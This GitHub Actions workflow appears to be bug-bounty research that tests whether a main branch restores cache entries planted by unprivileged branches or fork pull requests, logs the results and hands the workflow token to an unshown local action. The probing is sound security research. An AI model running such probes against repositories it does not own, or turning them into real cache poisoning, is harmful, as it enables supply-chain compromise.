name: restore-main
on:
  workflow_dispatch:
    inputs:
      nonce:
        required: false
        default: ''
      probekeys:
        required: false
        default: ''
permissions:
  contents: write
  actions: write
  id-token: write
jobs:
  restorejob:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - id: n
        run: |
          N="${{ inputs.nonce }}"; [ -z "$N" ] && N="$(cat NONCE.txt)"
          echo "n=$N" >> $GITHUB_OUTPUT
          echo -n "" > /tmp/restore.txt
      - run: rm -rf cachedir
      - name: A positive control - restore main own entry
        id: c1
        uses: actions/cache/restore@v4
        continue-on-error: true
        with: { path: cachedir, key: 'cbmain-${{ steps.n.outputs.n }}' }
      - run: |
          echo "A poscontrol-main-own hit=${{ steps.c1.outputs.cache-hit }} matched=${{ steps.c1.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: B probe - exact key only the unprivileged branch wrote
        id: c2
        uses: actions/cache/restore@v4
        continue-on-error: true
        with: { path: cachedir, key: 'cbtarget-${{ steps.n.outputs.n }}-exact' }
      - run: |
          echo "B probe-branch-exact hit=${{ steps.c2.outputs.cache-hit }} matched=${{ steps.c2.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: C probe - restore-keys prefix fallback onto the unprivileged bait
        id: c3
        uses: actions/cache/restore@v4
        continue-on-error: true
        with:
          path: cachedir
          key: 'zzz-no-such-key-${{ steps.n.outputs.n }}'
          restore-keys: 'cbtarget-${{ steps.n.outputs.n }}-'
      - run: |
          echo "C probe-branch-prefix hit=${{ steps.c3.outputs.cache-hit }} matched=${{ steps.c3.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: D probe - fork pull request exact key
        id: c4
        uses: actions/cache/restore@v4
        continue-on-error: true
        with: { path: cachedir, key: 'cbpr-${{ steps.n.outputs.n }}-exact' }
      - run: |
          echo "D probe-forkpr-exact hit=${{ steps.c4.outputs.cache-hit }} matched=${{ steps.c4.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: E probe - restore-keys prefix fallback onto the fork bait
        id: c5
        uses: actions/cache/restore@v4
        continue-on-error: true
        with:
          path: cachedir
          key: 'zzz-no-such-key2-${{ steps.n.outputs.n }}'
          restore-keys: 'cbpr-${{ steps.n.outputs.n }}-'
      - run: |
          echo "E probe-forkpr-prefix hit=${{ steps.c5.outputs.cache-hit }} matched=${{ steps.c5.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: F negative control - key nobody ever wrote
        id: c6
        uses: actions/cache/restore@v4
        continue-on-error: true
        with: { path: cachedir, key: 'cbnever-${{ steps.n.outputs.n }}' }
      - run: |
          echo "F negcontrol-never hit=${{ steps.c6.outputs.cache-hit }} matched=${{ steps.c6.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: G probe - prefix that matches BOTH main own and the unprivileged writes
        id: c7
        uses: actions/cache/restore@v4
        continue-on-error: true
        with:
          path: cachedir
          key: 'zzz-no-such-key3-${{ steps.n.outputs.n }}'
          restore-keys: 'cb'
      - run: |
          echo "G probe-broadprefix hit=${{ steps.c7.outputs.cache-hit }} matched=${{ steps.c7.outputs.cache-matched-key }} content=$(cat cachedir/marker.txt 2>/dev/null || echo NONE)" >> /tmp/restore.txt
          rm -rf cachedir
      - name: collect
        run: |
          cat /tmp/restore.txt
          curl -sS -X PUT -H "Authorization: Bearer ${{ github.token }}" -H "X-HackerOne: larocas" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/contents/cb_restore_${{ github.run_id }}.log" \
            -d "$(python3 -c "import json,base64;print(json.dumps({'message':'lane a7 restore','content':base64.b64encode(open('/tmp/restore.txt','rb').read()).decode()}))")" -o /dev/null -w "putcontents=%{http_code}\n"
      - name: probe
        uses: ./.github/actions/cbprobe
        with:
          mode: restore
          nonce: ${{ steps.n.outputs.n }}
          ghtok: ${{ github.token }}
          mainkey: cbmain-${{ steps.n.outputs.n }}
          mainver: '5815f4cade2696c8503fee1d72b56e6a4771a264cc2753c24c189700109b0e08'
          probekey: ${{ inputs.probekeys }}
